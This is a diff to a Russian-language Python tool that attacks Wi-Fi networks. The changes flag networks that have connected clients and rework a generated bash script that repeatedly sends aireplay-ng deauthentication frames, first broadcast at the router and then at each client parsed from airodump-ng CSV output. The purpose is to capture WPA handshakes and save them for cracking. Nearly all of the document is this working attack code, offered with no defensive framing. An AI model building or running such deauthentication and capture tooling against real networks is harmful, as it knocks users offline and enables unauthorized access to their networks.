@@ -77,7 +77,7 @@ def restore_managed(interface):
 # ============ Сканирование ============
 
 def parse_airodump_csv(csv_path):
-    """Парсит CSV от airodump-ng. Устойчив к ведущим пробелам в заголовке."""
+    """Парсит CSV от airodump-ng: AP + станции. Помечает сети с клиентами."""
     networks = []
     if not os.path.exists(csv_path):
         return networks
@@ -87,25 +87,31 @@ def parse_airodump_csv(csv_path):
     except Exception:
         return networks
 
-    # Пропускаем возможные пустые строки в начале файла
     start = 0
     while start < len(lines) and not lines[start].strip():
         start += 1
     if start >= len(lines):
         return networks
 
-    # Секция AP идёт до пустой строки или строки 'Station MAC'
     ap_lines = []
+    station_lines = []
+    in_stations = False
+
     for line in lines[start:]:
         s = line.rstrip('\n').rstrip('\r')
-        if not s.strip() or s.startswith('Station MAC'):
-            break
-        ap_lines.append(s)
+        if not s.strip():
+            continue
+        if s.startswith('Station MAC'):
+            in_stations = True
+            continue
+        if in_stations:
+            station_lines.append(s)
+        else:
+            ap_lines.append(s)
 
-    if len(ap_lines) < 2:      # только заголовок, данных ещё нет
+    if len(ap_lines) < 2:
         return networks
 
-    # Парсим вручную: в CSV заголовки идут как ' channel', ' ESSID' и т.п.
     header = [h.strip() for h in ap_lines[0].split(',')]
     col = {name.lower(): i for i, name in enumerate(header)}
     if 'bssid' not in col:
@@ -131,32 +137,67 @@ def parse_airodump_csv(csv_path):
             continue
 
         networks.append({
-            'bssid':   bssid,
-            'channel': get('channel'),
-            'essid':   get('essid'),
-            'privacy': get('privacy'),
-            'cipher':  get('cipher'),
-            'auth':    get('authentication'),
-            'power':   get('power'),
+            'bssid':        bssid,
+            'channel':      get('channel'),
+            'essid':        get('essid'),
+            'privacy':      get('privacy'),
+            'cipher':       get('cipher'),
+            'auth':         get('authentication'),
+            'power':        get('power'),
+            'has_stations': False,
         })
+
+    # Станции: формат "Station MAC, ..., BSSID AP, Probed ESSIDs"
+    stations_bssids = set()
+    for line in station_lines:
+        parts = line.split(',')
+        if len(parts) < 6:
+            continue
+        b = parts[5].strip()
+        if bssid_re.match(b):
+            stations_bssids.add(b.upper())
+
+    for net in networks:
+        if net['bssid'].upper() in stations_bssids:
+            net['has_stations'] = True
+
     return networks
+
+
+GREEN = "\033[92m"
+RESET = "\033[0m"
+
+
+def _power_to_int(p):
+    try:
+        return int(p)
+    except (ValueError, TypeError):
+        return -999
 
 
 def display_networks(networks):
     if not networks:
         print("[-] Сети не найдены.")
         return
+
+    # Слабые сверху (-90), сильные снизу (-40)
+    networks.sort(key=lambda n: _power_to_int(n['power']))
+
     print("\n{:<4} {:<20} {:<4} {:<6} {:<30} {:<12}".format(
         "№", "BSSID", "Ch", "PWR", "ESSID", "Шифрование"
     ))
     print("-" * 90)
+
     for i, net in enumerate(networks, 1):
         essid = net['essid'] if net['essid'] else '<скрытая>'
         privacy = net['privacy'] if net['privacy'] else 'Open'
-        print("{:<4} {:<20} {:<4} {:<6} {:<30} {:<12}".format(
+        line = "{:<4} {:<20} {:<4} {:<6} {:<30} {:<12}".format(
             i, net['bssid'], net['channel'], net['power'], essid[:28], privacy
-        ))
-
+        )
+        if net.get('has_stations'):
+            print(f"{GREEN}{line}{RESET}")
+        else:
+            print(line)
 
 def ask_scan_duration():
     print("\nВремя сканирования:")
@@ -214,9 +255,6 @@ def scan_networks(interface, duration, work_dir):
             "echo 'Сканирование 2.4 + 5 ГГц. Ctrl+C — остановить.'\n"
             "echo\n"
             f"{airodump_cmd}\n"
-            "echo\n"
-            "echo 'Сканирование завершено. Enter — закрыть окно.'\n"
-            "read\n"
         )
         script_path.chmod(0o755)
 
@@ -322,7 +360,7 @@ def _build_capture_script(work_dir, interface, target):
 
     cmd = (
         f'airodump-ng --bssid {bssid} --channel {channel} '
-        f'--write "{prefix}" --output-format pcap '
+        f'--write "{prefix}" --output-format pcap,csv '
         f'{interface}'
     )
 
@@ -333,28 +371,79 @@ def _build_capture_script(work_dir, interface, target):
         "echo 'Ctrl+C — остановить захват.'\n"
         "echo\n"
         f"{cmd}\n"
-        "echo\n"
-        "echo 'Захват завершён. Enter — закрыть окно.'\n"
-        "read\n"
     )
     script_path.chmod(0o755)
     return script_path, cap_file
 
 
-def _build_deauth_script(work_dir, interface, target, count=10):
-    """Готовит bash-скрипт для окна aireplay-ng --deauth."""
+def _build_deauth_script(work_dir, interface, target):
+    """
+    bash-скрипт для окна деаутентификации.
+    Фаза 1: broadcast на роутер (обнаружение клиентов).
+    Фаза 2: targeted deauth по каждому найденному клиенту.
+    Цикл повторяется, если handshake не пойман.
+    """
     bssid = target['bssid']
+    prefix = str(Path(work_dir) / f"capture_{bssid.replace(':', '')}")
+    csv_file = f"{prefix}-01.csv"
 
     script_path = Path(work_dir) / "deauth.sh"
     script_path.write_text(
         "#!/bin/bash\n"
-        f"echo '=== Деаутентификация: {bssid} ==='\n"
-        f"echo 'Пакетов за раз: {count}, повтор каждые 20 сек.'\n"
+        f'IFACE="{interface}"\n'
+        f'BSSID="{bssid}"\n'
+        f'CSV="{csv_file}"\n'
+        "\n"
+        "echo '=== Деаутентификация ==='\n"
+        "echo \"Цель (роутер): $BSSID\"\n"
+        "echo \"Интерфейс:     $IFACE\"\n"
+        "echo \"CSV станций:   $CSV\"\n"
         "echo 'Ctrl+C — остановить.'\n"
         "echo\n"
+        "\n"
+        "ROUND=0\n"
         "while true; do\n"
-        f"    aireplay-ng --deauth {count} -a {bssid} {interface}\n"
-        "    echo '--- пауза 20 сек ---'\n"
+        "    ROUND=$((ROUND+1))\n"
+        "    echo\n"
+        "    echo \"========== Раунд $ROUND ==========\"\n"
+        "\n"
+        "    # --- Фаза 1: broadcast на роутер ---\n"
+        "    echo \"[$(date +%H:%M:%S)] Фаза 1: broadcast deauth на роутер\"\n"
+        "    aireplay-ng --deauth 15 -a \"$BSSID\" \"$IFACE\" 2>&1 | tail -5\n"
+        "    echo \"[$(date +%H:%M:%S)] Ждём 8 сек, чтобы клиенты переподключились...\"\n"
+        "    sleep 8\n"
+        "\n"
+        "    # --- Читаем станции из CSV ---\n"
+        "    if [ ! -f \"$CSV\" ]; then\n"
+        "        echo \"[$(date +%H:%M:%S)] CSV ещё не создан, повторяю broadcast.\"\n"
+        "        continue\n"
+        "    fi\n"
+        "\n"
+        "    STATIONS=$(awk -F',' -v bssid=\"$BSSID\" '\n"
+        "        /^Station MAC/ { in_st = 1; next }\n"
+        "        in_st {\n"
+        "            gsub(/^ +| +$/, \"\", $1)\n"
+        "            gsub(/^ +| +$/, \"\", $6)\n"
+        "            if (toupper($6) == toupper(bssid) && $1 != \"\") print $1\n"
+        "        }\n"
+        "    ' \"$CSV\" | sort -u)\n"
+        "\n"
+        "    if [ -z \"$STATIONS\" ]; then\n"
+        "        echo \"[$(date +%H:%M:%S)] Клиентов пока нет. Повторяю broadcast.\"\n"
+        "        continue\n"
+        "    fi\n"
+        "\n"
+        "    N=$(echo \"$STATIONS\" | wc -l)\n"
+        "    echo \"[$(date +%H:%M:%S)] Обнаружено клиентов: $N\"\n"
+        "\n"
+        "    # --- Фаза 2: targeted deauth по каждому клиенту ---\n"
+        "    for STATION in $STATIONS; do\n"
+        "        echo \"[$(date +%H:%M:%S)] Фаза 2: targeted deauth -> $STATION\"\n"
+        "        aireplay-ng --deauth 20 -a \"$BSSID\" -c \"$STATION\" \"$IFACE\" 2>&1 | tail -3\n"
+        "        sleep 3\n"
+        "    done\n"
+        "\n"
+        "    echo \"[$(date +%H:%M:%S)] Все клиенты обработаны. Новый раунд через 20 сек...\"\n"
         "    sleep 20\n"
         "done\n"
     )
@@ -395,12 +484,13 @@ def _cap_file_stale(cap_file, threshold=15):
     return (time.time() - os.path.getmtime(cap_file)) > threshold
 
 
-
 def _revive_watchdog(interface, cap_file, stop_event,
-                     check_interval=5, stale_threshold=15, cooldown=20):
+                     check_interval=5, stale_threshold=15, cooldown=20,
+                     revive_seconds=20):
     """
     Следит за mtime .cap-файла. Если файл не обновляется stale_threshold
-    секунд — значит airodump-ng завис, гоняем airodump-ng <iface> 8 сек.
+    секунд — запускает airodump-ng БЕЗ фиксации канала на revive_seconds секунд,
+    чтобы драйвер переинициализировался.
     """
     last_revive = 0
     while not stop_event.is_set():
@@ -414,17 +504,19 @@ def _revive_watchdog(interface, cap_file, stop_event,
         if time.time() - last_revive < cooldown:
             continue
 
-        print(f"\n[!] .cap не обновляется >{stale_threshold} сек — оживляю драйвер.")
+        print(f"\n[!] .cap не обновляется >{stale_threshold} сек — "
+              f"оживляю без фиксации канала ({revive_seconds} сек).")
 
-        # Гоняем airodump-ng БЕЗ --bssid/--channel, чтобы драйвер переинициализировался
+        # Запускаем airodump-ng без --channel, чтобы он прошелся по всем каналам
+        revive_cmd = ["airodump-ng", interface]
+
         revive = subprocess.Popen(
-            ["airodump-ng", interface],
+            revive_cmd,
             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
             preexec_fn=os.setsid
         )
         try:
-            # 8 секунд — обычно хватает, чтобы канал сбросился
-            for _ in range(8):
+            for _ in range(revive_seconds):
                 time.sleep(1)
                 if stop_event.is_set():
                     break
@@ -479,7 +571,7 @@ def capture_handshake(interface, target, work_dir, timeout=180, deauth=True):
     # Окно с деаутентификацией
     deauth_term = None
     if deauth:
-        deauth_script = _build_deauth_script(work_dir, interface, target, count=10)
+        deauth_script = _build_deauth_script(work_dir, interface, target)
         if term_name is not None:
             deauth_term = _launch_in_terminal(term_name, term_cmd, deauth_script)
             if deauth_term is not None:
@@ -504,23 +596,21 @@ def capture_handshake(interface, target, work_dir, timeout=180, deauth=True):
     stop_watchdog = threading.Event()
     watchdog = threading.Thread(
         target=_revive_watchdog,
-        args=(interface, cap_file, stop_watchdog),   # ← передаём cap_file
+        args=(interface, cap_file, stop_watchdog), # channel убран
         daemon=True
     )
     watchdog.start()
-    print("[*] Watchdog запущен (следит за .cap).")
 
     start = time.time()
     found = False
     try:
         while time.time() - start < timeout:
-            # оба окна закрыты — пользователь сам всё свернул
-            cap_alive = cap_term is not None and cap_term.poll() is None
-            deauth_alive = deauth_term is not None and deauth_term.poll() is None
-            if cap_term is not None and not cap_alive and (
-                deauth_term is None or not deauth_alive
-            ):
-                print("\n[*] Окна закрыты пользователем. Останавливаю.")
+            # если ЛЮБОЕ окно закрыто — выходим, второе закроем в finally
+            if cap_term is not None and cap_term.poll() is not None:
+                print("\n[*] Окно захвата закрыто — закрываю второе.")
+                break
+            if deauth_term is not None and deauth_term.poll() is not None:
+                print("\n[*] Окно деаутентификации закрыто — закрываю второе.")
                 break
 
             if os.path.exists(cap_file) and check_handshake(cap_file):
@@ -598,6 +688,23 @@ def ask_save_path(cap_file):
 
     return target
 
+def choose_action():
+    """
+    Меню действий с выбранной сетью.
+    Возвращает строковый ключ действия или None, если пользователь отменил.
+    """
+    print("\nДействия с выбранной сетью:")
+    print("  1. Деаутентификация")
+    print()
+    print("  0. Назад")
+    while True:
+        c = input("Действие: ").strip()
+        if c == '0':
+            return None
+        if c == '1':
+            return 'deauth'
+        print("Неизвестный пункт. Введите 1 или 0.")
+
 def handshake_flow(interface):
     # Всё пишем во временную папку. Если handshake не поймаем — она удалится.
     tmp_dir = Path(tempfile.mkdtemp(prefix="wifitool_"))
@@ -612,53 +719,74 @@ def handshake_flow(interface):
 
         display_networks(networks)
 
-        # Выбор цели
+        # ---- Выбор цели (безопасный цикл) ----
+        target = None
         while True:
             try:
-                choice = input("\nВыберите номер сети (0 — отмена): ").strip()
-                if choice == '0':
-                    return
-                idx = int(choice) - 1
-                if 0 <= idx < len(networks):
-                    target = networks[idx]
-                    break
-                print(f"Ошибка: введите число от 1 до {len(networks)}.")
-            except ValueError:
-                print("Ошибка: нужно ввести целое число.")
+                choice = input(
+                    f"\nВыберите номер сети (1-{len(networks)}, 0 — отмена): "
+                ).strip()
+            except (KeyboardInterrupt, EOFError):
+                print("\n[*] Отменено.")
+                return
 
+            if choice == "":
+                print("Пустой ввод. Введите число или 0 для отмены.")
+                continue
+
+            if choice == "0":
+                print("[*] Отменено.")
+                return
+
+            try:
+                idx = int(choice) - 1
+            except ValueError:
+                print(f"Ошибка: нужно целое число от 0 до {len(networks)}.")
+                continue
+
+            if 0 <= idx < len(networks):
+                target = networks[idx]
+                break
+
+            print(f"Ошибка: число должно быть от 1 до {len(networks)}.")
+
+        # Сюда попадаем только когда target реально выбран
         print(f"\n[*] Цель: {target['essid'] or '<скрытая>'} ({target['bssid']})")
 
-        ans = input("Отправлять deauth? (Y/n): ").strip().lower()
-        deauth = ans != 'n'
+        action = choose_action()
+        if action is None:
+            print("[*] Отменено.")
+            return
 
-        try:
-            timeout_str = input("Таймаут захвата в секундах (Enter = 180): ").strip()
-            timeout = int(timeout_str) if timeout_str else 180
-            if timeout <= 0:
+        if action == 'deauth':
+            try:
+                timeout_str = input("\nТаймаут захвата в секундах (Enter = 180): ").strip()
+                timeout = int(timeout_str) if timeout_str else 180
+                if timeout <= 0:
+                    timeout = 180
+            except ValueError:
                 timeout = 180
-        except ValueError:
-            timeout = 180
 
-        cap_file = capture_handshake(
-            interface, target, tmp_dir, timeout=timeout, deauth=deauth
-        )
+            cap_file = capture_handshake(
+                interface, target, tmp_dir, timeout=timeout, deauth=True
+            )
 
-        # Сохраняем только если handshake реально пойман
-        if cap_file and os.path.exists(cap_file) and check_handshake(cap_file):
-            save_path = ask_save_path(cap_file)
-            if save_path:
-                try:
-                    shutil.move(cap_file, save_path)
-                    print(f"\n[+] Handshake сохранён: {save_path}")
-                except Exception as e:
-                    print(f"[-] Не удалось сохранить: {e}")
+            if cap_file and os.path.exists(cap_file) and check_handshake(cap_file):
+                save_path = ask_save_path(cap_file)
+                if save_path:
+                    try:
+                        shutil.move(cap_file, save_path)
+                        print(f"\n[+] Handshake сохранён: {save_path}")
+                    except Exception as e:
+                        print(f"[-] Не удалось сохранить: {e}")
+                else:
+                    print("[*] Файл не сохранён.")
             else:
-                print("[*] Файл не сохранён.")
+                print("\n[-] Handshake не пойман. Файлы не сохраняются.")
         else:
-            print("\n[-] Handshake не пойман. Файлы не сохраняются.")
+            print(f"[-] Неизвестное действие: {action}")
 
     finally:
-        # Чистим временную папку (и scan-*, и capture-*, и scan.sh)
         try:
             shutil.rmtree(tmp_dir, ignore_errors=True)
         except Exception:
